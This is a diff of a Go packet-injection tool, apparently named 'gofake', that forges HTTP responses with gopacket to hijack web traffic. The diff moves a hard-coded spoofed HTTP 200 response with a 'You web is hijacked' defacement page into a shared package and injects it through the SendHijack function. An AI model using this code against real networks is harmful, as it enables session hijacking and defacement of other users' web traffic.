@@ -2,35 +2,13 @@ package main
 
 import (
 	"fmt"
+	"gofake/common"
 	"strings"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
-
-var (
-	format = "HTTP/1.1 200 OK\r\n" +
-		"Server: nginx/1.10.3\r\n" +
-		"Date: Tue, 26 Jan 2016 13:09:19 GMT\r\n" +
-		"Content-Type: text/html;charset=UTF-8\r\n" +
-		"Connection: keep-alive\r\n" +
-		"Vary: Accept-Encoding\r\n" +
-		"Cache-Control: no-store\r\n" +
-		"Pragrma: no-cache\r\n" +
-		"Expires: Thu, 01 Jan 1970 00:00:00 GMT\r\n" +
-		"Cache-Control: no-cache\r\n" +
-		"Content-Length: %v\r\n" +
-		"\r\n" +
-		"%v"
-
-	content = `<html><h1>You web is hijacked, Haha</h1></html>`
-	body    []byte
-)
-
-func init() {
-	body = []byte(fmt.Sprintf(format, len(content), content))
-}
 
 // SendHijack 采用gopacket发送伪造包
 func SendHijack(handle *pcap.Handle, packet gopacket.Packet) {
@@ -86,8 +64,7 @@ func SendHijack(handle *pcap.Handle, packet gopacket.Packet) {
 		ComputeChecksums: true,
 	}
 
-	fmt.Printf("body=%v\n", string(body))
-	if err := gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &tcp, gopacket.Payload(body)); err != nil {
+	if err := gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &tcp, gopacket.Payload(common.Body)); err != nil {
 		fmt.Println(err)
 	}
 
